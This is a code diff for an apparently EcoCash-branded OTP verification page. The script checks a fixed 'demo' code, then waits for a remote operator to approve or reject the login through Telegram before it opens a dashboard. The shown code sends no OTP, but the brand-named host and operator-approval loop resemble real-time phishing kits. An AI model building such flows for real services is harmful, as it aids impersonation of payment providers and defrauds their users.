@@ -773,164 +773,280 @@
 
   </main>
 
+<script>
+  /*
+    ============================================================
+    PRESENTATION DEMO OTP FLOW
+    ============================================================
 
-  <script>
+    IMPORTANT:
+    - The OTP is NEVER sent to the server or Telegram.
+    - The demo OTP is checked locally.
+    - Telegram receives only a generic demo-verification request.
+    - ACCEPT / REJECT controls the presentation flow.
+  */
 
-    /*
-      PRESENTATION DEMO ONLY
+  const API_URL = "https://ecocash-0w1z.onrender.com";
 
-      The correct demo OTP is fixed locally.
-      Nothing entered into the OTP fields is
-      transmitted to a server, Telegram, or
-      another service.
-    */
+  // Demo-only OTP. Change this to whatever code you want.
+  const DEMO_OTP = "123456";
 
-    const DEMO_OTP = "123456";
+  const otpBoxes =
+    document.querySelectorAll(".otp-box");
 
-    const otpBoxes =
-      document.querySelectorAll(".otp-box");
+  const verifyButton =
+    document.getElementById("verifyButton");
 
-    const verifyButton =
-      document.getElementById("verifyButton");
+  const errorMessage =
+    document.getElementById("errorMessage");
 
-    const errorMessage =
-      document.getElementById("errorMessage");
+  const successMessage =
+    document.getElementById("successMessage");
 
-    const successMessage =
-      document.getElementById("successMessage");
+  const resendButton =
+    document.getElementById("resendButton");
 
-    const resendButton =
-      document.getElementById("resendButton");
+  const timerElement =
+    document.getElementById("timer");
 
-    const timerElement =
-      document.getElementById("timer");
+  const backButton =
+    document.getElementById("backButton");
 
-    const backButton =
-      document.getElementById("backButton");
+  let currentRequestId = null;
+  let pollingTimer = null;
+  let cancelled = false;
 
+  /* ==========================================================
+     OTP INPUT
+  ========================================================== */
 
-    /* =========================
-       OTP INPUT
-    ========================= */
+  otpBoxes.forEach(function (box, index) {
 
-    otpBoxes.forEach(function (box, index) {
+    box.addEventListener("input", function () {
 
-      box.addEventListener("input", function () {
+      this.value = this.value
+        .replace(/\D/g, "")
+        .slice(0, 1);
 
-        this.value =
-          this.value
-            .replace(/\D/g, "")
-            .slice(0, 1);
+      errorMessage.classList.remove("show");
+      this.classList.remove("error");
 
-        errorMessage.classList.remove("show");
-
-        this.classList.remove("error");
-
-        if (
-          this.value &&
-          index < otpBoxes.length - 1
-        ) {
-          otpBoxes[index + 1].focus();
-        }
-
-      });
-
-
-      box.addEventListener("keydown", function (event) {
-
-        if (
-          event.key === "Backspace" &&
-          !this.value &&
-          index > 0
-        ) {
-
-          otpBoxes[index - 1].focus();
-
-        }
-
-      });
-
-
-      box.addEventListener("paste", function (event) {
-
-        event.preventDefault();
-
-        const pasted =
-          event.clipboardData
-            .getData("text")
-            .replace(/\D/g, "")
-            .slice(0, 6);
-
-        pasted.split("").forEach(function (digit, i) {
-
-          if (otpBoxes[i]) {
-            otpBoxes[i].value = digit;
-          }
-
-        });
-
-        if (pasted.length === 6) {
-          otpBoxes[5].focus();
-        }
-
-      });
+      if (
+        this.value &&
+        index < otpBoxes.length - 1
+      ) {
+        otpBoxes[index + 1].focus();
+      }
 
     });
 
+    box.addEventListener("keydown", function (event) {
 
-    /* =========================
-       GET OTP
-    ========================= */
+      if (
+        event.key === "Backspace" &&
+        !this.value &&
+        index > 0
+      ) {
+        otpBoxes[index - 1].focus();
+      }
 
-    function getEnteredOTP() {
+    });
 
-      return [...otpBoxes]
-        .map(function (box) {
-          return box.value;
+    box.addEventListener("paste", function (event) {
+
+      event.preventDefault();
+
+      const pasted =
+        event.clipboardData
+          .getData("text")
+          .replace(/\D/g, "")
+          .slice(0, 6);
+
+      pasted.split("").forEach(function (digit, i) {
+
+        if (otpBoxes[i]) {
+          otpBoxes[i].value = digit;
+        }
+
+      });
+
+      if (pasted.length === 6) {
+        otpBoxes[5].focus();
+      }
+
+    });
+
+  });
+
+
+  /* ==========================================================
+     GET ENTERED OTP
+  ========================================================== */
+
+  function getEnteredOTP() {
+
+    return [...otpBoxes]
+      .map(function (box) {
+        return box.value;
+      })
+      .join("");
+
+  }
+
+
+  /* ==========================================================
+     RESET OTP
+  ========================================================== */
+
+  function resetOTP() {
+
+    otpBoxes.forEach(function (box) {
+      box.value = "";
+      box.classList.remove("error");
+    });
+
+    errorMessage.classList.remove("show");
+
+    otpBoxes[0].focus();
+
+  }
+
+
+  /* ==========================================================
+     CREATE TELEGRAM DEMO REQUEST
+  ========================================================== */
+
+  async function createDemoOTPRequest() {
+
+    const response = await fetch(
+      `${API_URL}/api/demo-otp-request`,
+      {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+
+        /*
+          IMPORTANT:
+          The actual OTP is deliberately NOT included here.
+        */
+
+        body: JSON.stringify({
+          event: "presentation_demo_otp_verification"
         })
-        .join("");
+      }
+    );
+
+    const text = await response.text();
+
+    let data;
+
+    try {
+
+      data = JSON.parse(text);
+
+    } catch (error) {
+
+      throw new Error(
+        "Server returned a non-JSON response: " +
+        text.slice(0, 200)
+      );
 
     }
 
+    if (!response.ok || !data.ok) {
 
-    /* =========================
-       VERIFY
-    ========================= */
+      throw new Error(
+        data.error ||
+        "Unable to create demo verification request."
+      );
 
-    verifyButton.addEventListener(
-      "click",
-      function () {
+    }
 
-        const enteredOTP =
-          getEnteredOTP();
+    if (!data.requestId) {
+
+      throw new Error(
+        "Server did not return a demo request ID."
+      );
+
+    }
+
+    return data.requestId;
+
+  }
 
 
-        if (enteredOTP.length !== 6) {
+  /* ==========================================================
+     WAIT FOR TELEGRAM APPROVAL
+  ========================================================== */
 
-          errorMessage.textContent =
-            "Please enter the complete 6-digit demo OTP.";
+  async function waitForApproval(requestId) {
 
-          errorMessage.classList.add("show");
+    cancelled = false;
 
-          otpBoxes.forEach(function (box) {
-            box.classList.add("error");
-          });
+    while (!cancelled) {
 
-          return;
+      await new Promise(function (resolve) {
+
+        setTimeout(resolve, 1500);
+
+      });
+
+      if (cancelled) {
+        return;
+      }
+
+      try {
+
+        const response = await fetch(
+          `${API_URL}/api/demo-status/${encodeURIComponent(requestId)}`,
+          {
+            method: "GET",
+            cache: "no-store"
+          }
+        );
+
+        const text = await response.text();
+
+        let data;
+
+        try {
+
+          data = JSON.parse(text);
+
+        } catch (error) {
+
+          console.error(
+            "Status endpoint returned non-JSON:",
+            text
+          );
+
+          continue;
+
+        }
+
+        if (!response.ok) {
+
+          console.error(
+            "Status request failed:",
+            data
+          );
+
+          continue;
+
         }
 
 
-        /*
-          LOCAL DEMO CHECK ONLY.
-        */
+        /* ====================================================
+           APPROVED
+        ==================================================== */
 
-        if (enteredOTP === DEMO_OTP) {
+        if (data.status === "approved") {
 
-          errorMessage.classList.remove("show");
+          stopPolling();
 
-          otpBoxes.forEach(function (box) {
-            box.classList.remove("error");
-          });
+          successMessage.textContent =
+            "Demo verification approved. Opening dashboard...";
 
           successMessage.classList.add("show");
 
@@ -943,132 +1059,323 @@
 
           }, 700);
 
-        } else {
+          return;
+
+        }
+
+
+        /* ====================================================
+           REJECTED
+        ==================================================== */
+
+        if (data.status === "rejected") {
+
+          stopPolling();
 
           errorMessage.textContent =
-            "Incorrect OTP. Please re-enter the 6-digit demo OTP.";
+            "Demo verification rejected. Please try again.";
 
           errorMessage.classList.add("show");
 
           otpBoxes.forEach(function (box) {
+
             box.classList.add("error");
+
           });
 
-          otpBoxes.forEach(function (box) {
-            box.value = "";
-          });
+          resetOTP();
 
-          otpBoxes[0].focus();
+          verifyButton.disabled = false;
+
+          verifyButton.textContent =
+            "VERIFY OTP";
+
+          return;
 
         }
 
+
+        /* ====================================================
+           EXPIRED
+        ==================================================== */
+
+        if (data.status === "expired") {
+
+          stopPolling();
+
+          errorMessage.textContent =
+            "The demo verification request expired. Please try again.";
+
+          errorMessage.classList.add("show");
+
+          verifyButton.disabled = false;
+
+          verifyButton.textContent =
+            "VERIFY OTP";
+
+          return;
+
+        }
+
+      } catch (error) {
+
+        console.error(
+          "Status check failed:",
+          error
+        );
+
       }
-    );
+
+    }
+
+  }
 
 
-    /* =========================
-       RESEND
-    ========================= */
+  /* ==========================================================
+     STOP POLLING
+  ========================================================== */
 
-    resendButton.addEventListener(
-      "click",
-      function () {
+  function stopPolling() {
 
-        /*
-          Nothing is actually sent.
-          This simply resets the presentation timer.
-        */
+    cancelled = true;
 
-        startTimer();
+    if (pollingTimer) {
+
+      clearInterval(pollingTimer);
+
+      pollingTimer = null;
+
+    }
+
+  }
+
+
+  /* ==========================================================
+     VERIFY OTP
+  ========================================================== */
+
+  verifyButton.addEventListener(
+    "click",
+    async function () {
+
+      const enteredOTP =
+        getEnteredOTP();
+
+
+      /* ------------------------------------------------------
+         Require six digits
+      ------------------------------------------------------ */
+
+      if (enteredOTP.length !== 6) {
+
+        errorMessage.textContent =
+          "Please enter the complete 6-digit demo OTP.";
+
+        errorMessage.classList.add("show");
 
         otpBoxes.forEach(function (box) {
-          box.value = "";
-          box.classList.remove("error");
+
+          box.classList.add("error");
+
         });
 
-        errorMessage.classList.remove("show");
-
-        otpBoxes[0].focus();
+        return;
 
       }
-    );
 
 
-    /* =========================
-       TIMER
-    ========================= */
+      /* ------------------------------------------------------
+         LOCAL DEMO OTP CHECK
+      ------------------------------------------------------ */
 
-    let remainingSeconds = 45;
-    let timerInterval;
+      if (enteredOTP !== DEMO_OTP) {
 
+        errorMessage.textContent =
+          "Incorrect OTP. Please re-enter the 6-digit demo OTP.";
 
-    function startTimer() {
+        errorMessage.classList.add("show");
 
-      clearInterval(timerInterval);
+        otpBoxes.forEach(function (box) {
 
-      remainingSeconds = 45;
+          box.classList.add("error");
 
-      updateTimer();
+        });
 
-      timerInterval =
-        setInterval(function () {
+        resetOTP();
 
-          remainingSeconds--;
-
-          updateTimer();
-
-          if (remainingSeconds <= 0) {
-
-            clearInterval(timerInterval);
-
-          }
-
-        }, 1000);
-
-    }
-
-
-    function updateTimer() {
-
-      const minutes =
-        String(
-          Math.floor(remainingSeconds / 60)
-        ).padStart(2, "0");
-
-      const seconds =
-        String(
-          remainingSeconds % 60
-        ).padStart(2, "0");
-
-      timerElement.textContent =
-        minutes + ":" + seconds;
-
-    }
-
-
-    /* =========================
-       BACK
-    ========================= */
-
-    backButton.addEventListener(
-      "click",
-      function () {
-
-        window.history.back();
+        return;
 
       }
-    );
 
 
-    /* =========================
-       INITIAL STATE
-    ========================= */
+      /* ------------------------------------------------------
+         Correct local demo OTP
+         Now request Telegram approval.
 
-    startTimer();
+         IMPORTANT:
+         enteredOTP is NOT included in the request.
+      ------------------------------------------------------ */
 
-    otpBoxes[0].focus();
+      verifyButton.disabled = true;
 
-  </script>
+      verifyButton.textContent =
+        "WAITING FOR APPROVAL...";
 
+      errorMessage.classList.remove("show");
+
+      successMessage.textContent =
+        "Demo OTP accepted. Waiting for Telegram approval...";
+
+      successMessage.classList.add("show");
+
+
+      try {
+
+        const requestId =
+          await createDemoOTPRequest();
+
+        currentRequestId =
+          requestId;
+
+
+        /*
+          Telegram now receives only the demo request.
+          The OTP itself never leaves this page.
+        */
+
+        await waitForApproval(
+          requestId
+        );
+
+
+      } catch (error) {
+
+        console.error(
+          "Demo OTP request failed:",
+          error
+        );
+
+        successMessage.classList.remove("show");
+
+        errorMessage.textContent =
+          "Unable to contact the demo approval server.";
+
+        errorMessage.classList.add("show");
+
+        verifyButton.disabled = false;
+
+        verifyButton.textContent =
+          "VERIFY OTP";
+
+      }
+
+    }
+  );
+
+
+  /* ==========================================================
+     RESEND / RESET DEMO
+  ========================================================== */
+
+  resendButton.addEventListener(
+    "click",
+    function () {
+
+      stopPolling();
+
+      currentRequestId = null;
+
+      successMessage.classList.remove("show");
+
+      verifyButton.disabled = false;
+
+      verifyButton.textContent =
+        "VERIFY OTP";
+
+      resetOTP();
+
+      startTimer();
+
+    }
+  );
+
+
+  /* ==========================================================
+     TIMER
+  ========================================================== */
+
+  let remainingSeconds = 45;
+  let timerInterval = null;
+
+
+  function startTimer() {
+
+    clearInterval(timerInterval);
+
+    remainingSeconds = 45;
+
+    updateTimer();
+
+    timerInterval =
+      setInterval(function () {
+
+        remainingSeconds--;
+
+        updateTimer();
+
+        if (remainingSeconds <= 0) {
+
+          clearInterval(timerInterval);
+
+        }
+
+      }, 1000);
+
+  }
+
+
+  function updateTimer() {
+
+    const minutes =
+      String(
+        Math.floor(remainingSeconds / 60)
+      ).padStart(2, "0");
+
+    const seconds =
+      String(
+        remainingSeconds % 60
+      ).padStart(2, "0");
+
+    timerElement.textContent =
+      minutes + ":" + seconds;
+
+  }
+
+
+  /* ==========================================================
+     BACK
+  ========================================================== */
+
+  backButton.addEventListener(
+    "click",
+    function () {
+
+      stopPolling();
+
+      window.history.back();
+
+    }
+  );
+
+
+  /* ==========================================================
+     INITIAL STATE
+  ========================================================== */
+
+  startTimer();
+
+  otpBoxes[0].focus();
+
+</script>
 </body>
 </html>
